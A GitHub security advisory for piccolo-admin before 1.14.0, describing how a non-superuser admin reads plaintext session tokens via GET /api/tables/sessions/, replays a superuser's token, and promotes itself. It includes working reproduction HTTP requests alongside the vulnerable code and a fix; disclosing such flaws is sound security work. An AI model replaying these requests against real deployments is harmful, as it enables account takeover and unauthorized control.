# [H] piccolo-admin has a privilege escalation issue - admin to superuser via session-token disclosure in GET /api/tables/sessions/.

## Summary
Severity: High
Advisory: GHSA-2gh4-jmwq-rr8w
CVE: CVE-2026-55485
CWE: CWE-200, CWE-269, CWE-863
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-2gh4-jmwq-rr8w
Type: github-advisory

## Affected
- PyPI: `piccolo-admin` — affected >=0 <1.14.0

## Details
## Summary

`piccolo_admin` uses a helper called `superuser_validators` to gate access to the user and session tables for non-superusers. The helper rejects `PUT`, `PATCH`, `DELETE`, and `POST`, but **does not reject `GET`**.

The `sessions` table stores live session tokens **in plaintext**, and the token column is not marked `secret=True`, so it is included in every `GET` response. Any non-superuser admin can therefore list every other user's live session token with one request, replay the token as their own `Cookie: id=…`, impersonate that user (including the superuser), and then permanently self-promote by writing `superuser = true` on their own row.

The chain is reachable on a realistic, documented configuration: a deployer adds the `Sessions` (and `User`) tables to `create_admin([...])` so superusers have a UI to monitor and revoke sessions.

## Affected component

- **File**: `piccolo_admin/endpoints.py`
- **Function**: `superuser_validators` (around line 419)

```python
def superuser_validators(piccolo_crud: PiccoloCRUD, request: Request):
    user: BaseUser = request.user.user
    if not user.superuser:
        if request.method.upper() in ["PUT", "PATCH", "DELETE", "POST"]:
            raise HTTPException(
                detail="Only superusers can perform these actions.",
                status_code=405,
            )
```

The method check is a **deny-list** instead of an **allow-list**; `GET` is absent. Compounding the issue, `SessionsBase.token` in `piccolo_api/session_auth/tables.py` is a `Varchar` without `secret=True`, so the default `exclude_secrets=True` in `PiccoloCRUD` does not strip it.

## Preconditions

1. Network reachability to the admin.
2. Valid credentials for a non-superuser admin (`admin=True, superuser=False` — the default role created by `BaseUser.create_user(admin=True)`).
3. The deployment includes the `Sessions` table (and typically the `User` table) in `create_admin([...])` — the documented pattern for "active sessions" management UIs.

## Steps to reproduce

1. **Log in as the non-superuser admin** (`john / john123`). Open the *Piccolo User* table and confirm john's `SUPERUSER` column is **✗**. *(See Screenshot 1.)*
<img width="3024" height="1430" alt="01-john-piccolo_user-list" src="https://github.com/user-attachments/assets/31a6f81e-7d12-434a-ac99-ff64e15511f9" />

2. **Attempt the target write directly.** Send the following request:

   ```http
   PATCH /api/tables/piccolo_user/2/ HTTP/1.1
   Host: target:8001
   Content-Type: application/json
   Cookie: id=<john's session>; csrftoken=<token>
   X-CSRFToken: <token>

   {"superuser": true}
   ```

   The server returns:

   ```
   HTTP/1.1 405
   {"detail":"Only superusers can perform these actions."}
   ```

   The same response is shown both in the dashboard banner *(Screenshot 2)* and in Burp Repeater *(Screenshot 3)*. This establishes the privilege boundary that the bug will break.
<img width="3024" height="2158" alt="02-john-save-blocked-405" src="https://github.com/user-attachments/assets/81f4b0b6-fe58-43da-b63e-6161e5911fc0" />
<img width="1213" height="713" alt="03-john-save-blocked-405" src="https://github.com/user-attachments/assets/2eb33b00-a209-4e92-b18b-1f6520dde702" />

3. **Leak the credential.** As the same john user, request:

   ```http
   GET /api/tables/sessions/ HTTP/1.1
   Host: target:8001
   Cookie: id=<john's session>; csrftoken=<token>
   ```

   Response: `200 OK` containing every active session in plaintext, e.g.

   ```json
   {"rows":[
     {"token":"jeb1d-IXIC0BWTOV6G-ApTksrbvdBDkZV9KN4taN2nE","user_id":1, ...},
     {"token":"...","user_id":2, ...},
     ...
   ]}
   ```

   Copy the `token` value of any row whose `user_id` matches the superuser. **That string IS the live session cookie of that user.** *(Screenshot 4.)*
<img width="1512" height="850" alt="04-john-sees-all-session-tokens" src="https://github.com/user-attachments/assets/3303231f-ed87-4b32-8cab-7aa480315529" />

4. **Replay the step-2 PATCH with the stolen cookie.** Send the exact same request as step 2, changing only the `Cookie: id=` value to the stolen token:

   ```http
   PATCH /api/tables/piccolo_user/2/ HTTP/1.1
   Host: target:8001
   Content-Type: application/json
   Cookie: id=jeb1d-IXIC0BWTOV6G-ApTksrbvdBDkZV9KN4taN2nE; csrftoken=<token>
   X-CSRFToken: <token>

   {"superuser": true}
   ```

   Response: `200 OK`, body shows `"superuser": true` for john. *(Screenshot 5.)*
<img width="1213" height="713" alt="05-john-self-promote" src="https://github.com/user-attachments/assets/4399866a-06e8-4568-b599-922a5b16805e" />

5. **Verify persistence.** Log in fresh as `john / john123` (no stolen cookie). John is now a superuser. The stolen cookie is no longer needed — the elevation is permanent on john's own row.

## Impact

Full superuser takeover of the admin from any non-superuser admin account. The promoted attacker can:

- read/write/delete any row in any table the admin exposes;
- revoke any other session, locking out other admins;
- change any user's password;
- export data (including via the bulk CSV download forms);
- plant payloads (e.g. CSV-formula injections) that fire when higher-trust operators open exports.

Persistence is automatic — once the attacker writes `superuser=true` on their own row in step 4, the stolen cookie can be discarded.

## Suggested fix

**Primary (single-line):** make `superuser_validators` reject **all** requests from non-superusers — there is no legitimate non-superuser use case for the user or session tables in this context:

```python
def superuser_validators(piccolo_crud, request):
    if not request.user.user.superuser:
        raise HTTPException(
            status_code=403,
            detail="Only superusers can access this resource.",
        )
```

**Defence in depth:** in `piccolo_api/session_auth/tables.py`, mark `SessionsBase.token` with `secret=True`. The existing `exclude_secrets=True` default on `PiccoloCRUD` then strips the field from every response, closing the leak even if the validator is later misconfigured by a downstream consumer.

## Severity

**CVSS 3.1: 8.8 HIGH** — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`

Reasoning:
- **AV:N** — accessible over the network.
- **AC:L** — single GET; no race or timing dependency.
- **PR:L** — requires non-superuser admin credentials (the default admin role).
- **UI:N** — no victim interaction needed.
- **S:U** — scope kept Unchanged to be conservative; some auditors may prefer `S:C` (which yields 9.9 Critical) because crossing from admin to superuser breaks an explicit, named privilege gate.
- **C:H / I:H / A:H** — full read, full write, full availability impact on the admin's data and on other users' sessions.

## Weaknesses

- **CWE-269** Improper Privilege Management *(primary)*
- **CWE-200** Exposure of Sensitive Information to an Unauthorized Actor
- **CWE-863** Incorrect Authorization

## Notes for the maintainer

- The vulnerability is reachable on any version where `superuser_validators` uses a method deny-list and `SessionsBase.token` is not `secret=True`. I tested against `piccolo_admin 1.13.0` + `piccolo_api 1.9.0`.
- The shipped `admin_demo` does not expose the `Sessions` table, so the bug is not reproducible against the demo as-shipped. The PoC harness used a minimal `create_admin([..., TableConfig(User), TableConfig(Sessions)], auth_table=User, session_table=Sessions)` configuration, which mirrors the documented "Sessions admin view" pattern.
- I'm happy to coordinate disclosure timing and validate any candidate patch.

## References
- https://github.com/piccolo-orm/piccolo_admin/security/advisories/GHSA-2gh4-jmwq-rr8w
- https://github.com/piccolo-orm/piccolo_api/pull/331
- https://github.com/piccolo-orm/piccolo_admin/commit/96ddae12baf12288056cbb0cda6f9e8d7e22c86d
- https://github.com/piccolo-orm/piccolo_api/commit/520ec2567ae1d2cc417c8c0d1ad0ddc05549a8a4
- https://github.com/piccolo-orm/piccolo_admin
- https://github.com/piccolo-orm/piccolo_admin/releases/tag/1.14.0
- https://github.com/piccolo-orm/piccolo_api/releases/tag/1.10.0
